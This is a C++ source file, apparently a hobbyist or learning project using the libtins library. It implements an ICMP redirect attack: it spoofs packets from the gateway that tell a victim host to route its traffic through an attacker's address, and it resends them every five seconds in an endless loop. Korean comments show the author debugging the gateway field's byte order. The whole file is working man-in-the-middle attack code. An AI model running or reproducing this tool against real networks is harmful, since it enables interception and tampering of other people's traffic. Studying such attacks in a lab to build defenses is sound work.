
#define TINS_STATIC
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <unistd.h>
#endif // _WIN32
using namespace Tins;
using std::cout;
using std::runtime_error;
using std::endl;



void icmp_redirect(NetworkInterface iface,IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip,const NetworkInterface::Info& info)
{
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw;
	attack_hw = info.hw_addr; // my macaddress get
	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
	cout << " Using victim hw address:  " << victim_hw << "\n";
	cout << " Using own hw address:     " << info.hw_addr << "\n";
	ICMP icmp;


	icmp.set_redirect(1, attack);
	//문제점은 와이어샤크에서 icmp gate way가 꺼꾸로 출력되어져있음?
	//network byte가 아닌듯.. 그냥 들어가는거 같음.
	//다른것들은 제대로 변환되서 들어가는데 왜 이것만???

	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp; // + 8바이트추가
	
	while (true) {
		sender.send(do_icmp, iface);
#ifdef _WIN32
		Sleep(5);
#else
		sleep(5);
#endif
	}
}

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <Default>" << endl;
		return 1;
	}

	IPv4Address gw, victim ,attack, web_ip;
	EthernetII::address_type own_hw;
	try {
		gw = argv[1];
		attack = argv[2];
		victim = argv[3];
		web_ip = argv[4];
	}
	catch (...) {
		cout << "Invalid ip found...\n";
		return 2;
	}
	NetworkInterface iface;
	NetworkInterface::Info info;
	try {
		iface = gw;
		info = iface.addresses();
		own_hw = info.hw_addr;
	}
	catch (runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}

	try {
		icmp_redirect(iface, gw,attack,victim,web_ip,info);
	}
	catch (runtime_error& ex) {
		cout << "Runtime error: " << ex.what() << endl;
		return 7;
	}


}